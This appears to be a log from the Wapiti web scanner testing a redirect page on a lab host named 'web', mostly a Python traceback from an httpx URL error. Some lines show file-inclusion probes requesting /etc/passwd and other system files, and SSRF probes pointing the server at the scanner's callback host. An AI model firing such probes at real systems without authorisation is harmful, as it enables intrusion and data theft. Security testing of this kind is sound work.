+2024-03-20 16:56:06.345 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%2Fetc%2Fpasswd%00&form=submit (0)
+2024-03-20 16:56:06.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%2Fetc%2Fservices&form=submit (0)
+2024-03-20 16:56:06.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%2Fetc%2Fservices%00&form=submit (0)
+2024-03-20 16:56:06.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (0)
+2024-03-20 16:56:06.391 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x73e28d898900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x73e28d898860>
+    │       └ <function run at 0x73e292573560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x73e28dac7240>
+           │      └ <function Runner.run at 0x73e2923fefc0>
+           └ <asyncio.runners.Runner object at 0x73e292ef4b90>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x73e2923fcc20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x73e292ef4b90>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x73e2923fcb80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x73e2923fe980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x73e29255ce00>
+    └ <Handle <TaskStepMethWrapper object at 0x73e28cc134f0>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x73e28cc134f0>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x73e28cc134f0>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x73e28cc134f0>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x73e28db37a50 [unset]>
+          │   └ <function Wapiti.attack at 0x73e28d902520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x73e28dbfcc90>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x73e28c297010>
+          │             │      └ GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+          │             └ <function ModuleFile.attack at 0x73e28cbb72e0>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x73e28cbc36d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (0)
+                     │    │       └ <function AsyncCrawler.async_send at 0x73e291256020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x73e28cbc36d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit (0)
+                     │    └ <function AsyncCrawler.async_get at 0x73e291256160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>, GET http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindow...
+                  └ <function AsyncCrawler.async_get at 0x73e2912560c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x73e2917bd1c0>
+                     │    └ <httpx.AsyncClient object at 0x73e28da51050>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x73e2917bd260>
+                     └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x73e2917bd300>
+                     └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit')>
+              │    └ <function BaseClient._build_redirect_request at 0x73e2917afc40>
+              └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit')>
+          │    └ <function BaseClient._redirect_url at 0x73e2917afd80>
+          └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x73e291eb2160>
+          │   │              │       └ URL('http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit')
+          │   │              └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&form=submit')>
+          │   └ <function URL.copy_with at 0x73e291ed18a0>
+          └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x73e291ed0400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', query=None,...
+    │                     └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', 'query': None, 'fragment': None,...
+           └ <function urlparse at 0x73e291ed0220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices'
+    └ <function validate_path at 0x73e291ed0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 16:56:06.460 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 16:56:06.544 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report be462e48-e6da-11ee-aacc-0242ac160004 ... SUCCESS
+2024-03-20 16:56:06.548 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:56:06.559 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:06.560 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fg7dzzw%2F1%2F75726c%2F&form=submit (0)
+2024-03-20 16:56:06.566 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fg7dzzw%2F1%2F666f726d%2F (0)
+2024-03-20 16:56:06.598 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=g7dzzw for results, please wait...
+2024-03-20 16:56:08.694 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 16:56:08.799 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 16:56:08.821 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//redirect1.json/
+2024-03-20 16:56:08.821 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//redirect1.json/web_03202024_1656.html with a browser to see this report.
